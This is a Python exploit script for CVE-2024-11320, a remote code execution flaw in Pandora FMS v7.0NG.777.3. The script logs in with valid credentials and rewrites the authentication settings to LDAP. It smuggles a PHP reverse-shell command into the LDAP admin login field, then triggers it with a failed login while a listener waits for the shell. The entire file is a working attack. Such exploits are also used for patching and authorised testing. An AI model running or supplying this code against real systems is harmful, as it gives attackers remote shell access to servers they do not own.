#!/usr/bin/python3

# Exploit Title: Pandora v7.0NG.777.3 Remote Code Execution
# Date: 02/11/2024
# Exploit Author: Askar (@mhaskar01)
# CVE: CVE-2024-11320
# Vendor Homepage: https://pandorafms.org/
# Version: Version v7.0NG.777.3 Andromeda - FREE
# Tested on: Ubuntu 22.04 Server - PHP 8.0.29

import telnetlib
import requests
import socket
import sys

from threading import Thread
from bs4 import BeautifulSoup

if len(sys.argv) != 6:
    print("[+] Usage : ./exploit.py target username password ip port")
    exit()

target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = int(sys.argv[5])
payload = "';php -r '$sock=fsockopen(\"%s\", %s);exec(\"/bin/sh -i <&3 >&3 2>&3\");' #" % (ip, port)

def connection_handler(port):
    print("[+] Shell listener started on port %s" % port)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(port)))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection received from %s" % addr[0])
    t.sock = conn
    print("[+] Heads up, incoming shellzzz!!")
    t.interact()

def login():
    request = requests.session()

    login_url = target + "/index.php?login=1"
    first_login_request = request.get(login_url)
    content = first_login_request.text

    soup2 = BeautifulSoup(content, "lxml")
    login_csrf_token = soup2.find_all("input", id="hidden-csrf_code")[0].get("value")

    login_info = {
        "nick": username,
        "pass": password,
        "login_button": "Let's go",
        "csrf_code": login_csrf_token

    }

    login_request = request.post(
        login_url,
        login_info,
        verify=False,
        allow_redirects=True
    )

    resp = login_request.text

    if "Login failed" in resp:
        print("[-] Login Failed")
        return False
    else:
        print("[+] Valid Session!")
        return request

def update_auth_to_ldap(request):
    update_auth_url = target + "/index.php?sec=general&sec2=godmode/setup/setup&section=auth"
    req = request.get(update_auth_url)
    content = req.text
    soup2 = BeautifulSoup(content, "lxml")
    login_csrf_token = soup2.find_all("input", id="hidden-csrf_code")[0].get("value")
    print("[+] Using Token %s" % login_csrf_token)

    update_auth_to_ldap_data = {
        "update_config":"1",
        "csrf_code": login_csrf_token,
        "auth":"ldap",
        "fallback_local_auth":"1",
        "fallback_local_auth_sent":"1",
        "ldap_server":"localhost",
        "ldap_port":"389",
        "ldap_version":"3",
        "ldap_start_tls_sent":"1",
        "ldap_base_dn":"ou%3DPeople%2Cdc%3Dedu%2Cdc%3Dexample%2Cdc%3Dorg",
        "ldap_login_attr":"uid",
        # payload
        "ldap_admin_login": payload,
        "ldap_admin_pass":"test",
        "ldap_search_timeout":"0",
        "secondary_ldap_enabled_sent":"1",
        "ldap_server_secondary":"localhost",
        "ldap_port_secondary":"389",
        "ldap_version_secondary":"3",
        "ldap_start_tls_secondary_sent":"1",
        "ldap_base_dn_secondary":"ou%3DPeople%2Cdc%3Dedu%2Cdc%3Dexample%2Cdc%3Dorg",
        "ldap_login_attr_secondary":"uid",
        "ldap_admin_login_secondary":"",
        "ldap_admin_pass_secondary":"",
        "double_auth_enabled_sent":"1",
        "2FA_all_users_sent":"1",
        "session_timeout":"90",
        "update_button":"Update",

        # this one will pass us to the vulnerable function
        "ldap_function":"local",

    }
    headers = {"Referer": update_auth_url}
    request2 = request.post(update_auth_url, update_auth_to_ldap_data, verify=False, headers=headers)
    resp = request2.text
    if "Correctly updated the setup options" in resp:
        print("[+] Injecting session value!")
        return True
    else:
        print("[-] Error while updating Auth logic!")
        return False
    

def trigger_payload():
    print("[+] Triggering payload!")

    handler_thread = Thread(target=connection_handler, args=(port,))
    handler_thread.start()

    login_url = target + "/index.php?login=1"
    first_login_request = requests.get(login_url)
    content = first_login_request.text

    soup2 = BeautifulSoup(content, "lxml")
    login_csrf_token = soup2.find_all("input", id="hidden-csrf_code")[0].get("value")

    login_info = {
        "nick": "BlaBla",
        "pass": "AnyThing",
        "login_button": "Let's go",
        "csrf_code": login_csrf_token

    }

    login_request = requests.post(
        login_url,
        login_info,
        verify=False,
        allow_redirects=True
    )    

request = login()
if request:
    if update_auth_to_ldap(request):
        trigger_payload()
    

    # Update auth by sending a first request to get the CSRF then send the full request
